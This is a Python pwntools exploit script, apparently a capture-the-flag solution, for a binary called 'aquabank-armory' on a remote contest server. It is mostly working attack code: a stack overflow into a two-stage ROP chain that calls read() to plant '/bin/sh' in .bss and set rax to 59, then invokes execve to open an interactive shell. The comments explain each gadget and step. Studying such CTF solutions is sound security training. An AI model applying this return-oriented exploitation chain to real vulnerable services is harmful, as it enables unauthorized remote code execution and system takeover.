#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./aquabank-armory', checksec=False)

p = remote("offsec.m0lecon.it", 13567)

OFFSET_TO_RIP = 72

# By running: nm ./aquabank-armory | grep "ret"
# we find that:
POP_RDI_RET = 0x40196a
POP_RSI_RET = 0x401973
POP_RDX_RET = 0x40197c
SYSCALL_RET = 0x401985

# By running: nm ./aquabank-armory | grep "__libc_read"
# we find that the address of read() in libc is:
LIBC_READ = 0x4196b0


# ======= THE STRATEGY IS: =======
# We have gadgets to control rdi, rsi, rdx plus a syscall_ret — but NO pop_rax gadget !!!
# Without rax we cannot set the syscall number directly.
#
# The two missing pieces are:
#   1. The string "/bin/sh" -> it exists nowhere in the binary.
#   2. A way to set rax = 59 (execve syscall number) without a pop_rax gadget.
#
# First of all, we can solve a portion of the problem by calling __libc_read()
# instead of invoking the read() syscall manually.
#
# The key insight: if we call __libc_read(0, BSS, 59), it will:
#   - block on stdin, waiting for us to send exactly 59 bytes
#   - write our input (starting with "/bin/sh\x00") into .bss
#   - return 59 in rax — which is exactly the execve syscall number!
#
# Stage 1 => __libc_read(0, BSS, 59)
#            blocks on stdin, waits for us to send "/bin/sh\x00" + 51 padding bytes,
#            writes "/bin/sh\x00" into .bss,
#            leaves rax = 59 on return.
#
# Stage 2 => execve(BSS, NULL, NULL)
#            rax = 59 already set by read() return value,
#            rdi points to the "/bin/sh" we just planted,
#            rsi and rdx are NULL -> syscall -> shell.


# Target address to write the "/bin/sh\x00" string (this will be used as an argument for the execve syscall)
# .bss start => will hold "/bin/sh\x00"
BSS = elf.bss()     # or run: objdump -h ./arsenal | grep .bss

stage1 = flat(
    # Stage 1a: read(0, BSS, 59)  ->  rax = 59  (bytes read = execve syscall number)
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI_RET), p64(0),   # read(0, ...) -> read from stdin
    p64(POP_RSI_RET), p64(BSS), # read(0, BSS, ...) -> write to .bss section
    p64(POP_RDX_RET), p64(59),  # read(0, BSS, 59) -> read exactly 59 bytes so that rax=59 on return
    p64(LIBC_READ),             # call read() to read the second stage (1b) payload

    # Stage 1b: Write "/bin/sh\x00" to the .bss section
    p64(POP_RDI_RET), p64(BSS), # execve(BSS, ...) -> the first argument is the pointer to the "/bin/sh\x00" string in .bss
    p64(POP_RSI_RET), p64(0),   # execve(BSS, 0, ...) -> the second argument (argv) is set to NULL
    p64(POP_RDX_RET), p64(0),   # execve(BSS, 0, 0) -> the third argument (envp) is set to NULL
    p64(SYSCALL_RET)            # invoke the execve() syscall (since rax=59 <==> execve) to execute "/bin/sh" and get a shell
)

stage2 = b'/bin/sh\x00' + b'A' * 51     # note that "/bin/sh\x00" is padded to EXACTLY 59 bytes so that read() returns 59;
                                        # once 59 bytes have been read, rax will be set to 59 (which is the syscall number for the execve() function)

p.recvuntil(b'[armory] Storeroom open -- pick your weapons:')
p.send(stage1)

# wait for puts("[armory] Locking down.") to confirm we returned normally
p.recvuntil(b'[armory] Locking down.')

# now the ROP is running: __libc_read is waiting for 59 bytes
p.send(stage2)

p.interactive()